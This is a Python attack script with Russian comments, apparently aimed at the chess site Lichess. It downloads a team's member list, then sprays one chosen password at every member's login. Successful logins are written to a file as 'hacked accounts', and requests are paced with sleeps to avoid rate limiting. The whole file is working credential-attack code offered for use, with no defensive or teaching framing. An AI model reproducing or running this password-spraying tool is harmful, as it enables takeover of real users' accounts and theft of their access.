import ndjson
import requests

from config import *


def start(password, team):
    print(yellow + "[..] Получаем список, это может занять некоторое время...")
    r_m = requests.get(f'https://{SERVER}/{API}/{TEAM}/' + team + f'/{USERS}')
    users = r_m.json(cls=ndjson.Decoder)

    # Выводим сообщение, что список готов
    print(green + f"[+] Список пользователей получен!")
    print(
        cyan + f"[TIP] Запрос {str(OK_RESPONSE)} означает, что акк взломан. {str(ERROR_RESPONSE)} - не получилось. {str(BLOCKED_RESPONSE)} - личесс заблокировал запрос(рекомендуется выключить программу)") # вывод подсказкм
    #
    print(green + f"Взломанные аккаунты будут сохранены в файл {CHECKING_PATH}/{team}.txt") # вывод о том куда будут сохранятся взломанные акки

    # Начинаем перебор
    k = 0
    for user in users:

        #   Получаем ник участника
        username = user[f"{JSON_USERNAME}"]

        if (len(username) < 4): continue # проверка на работоспособность имени пользователя, имя пользователя на личесе минимум из 4-х символов

        r = requests.post(f"https://{SERVER}/{LOGIN}",
                          data={"username": username, "password": password, "remember": f"{str(JSON_REMEMBER)}"},
                          headers={"X-Requested-With": X_REQUESTED_WITH,
                                   "User-Agent": USER_AGENT}) # пытатаемся войти в акк

        print(cyan + f"{get_ts()} {r}, {username}: {password}")
        k += 1

        if str(r) == f"<Response [{OK_RESPONSE}]>":
            with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list: # сохраняем в файл взломанные акки
                h_list.write(f"{get_ts()} {username}: {password} \n")

        time.sleep(5)
        if k % 10 == 0:
            time.sleep(PASSWORDCHECK_TIMEOUT)  # ждем потому что таймаут после каждого 10 подбора


if __name__ == "__main__":
    start(password=input(green + "Введите пароль, которым вы хотите проверить клуб: " + magenta),
          team=input(yellow + "Введите ID клуба: " + magenta))
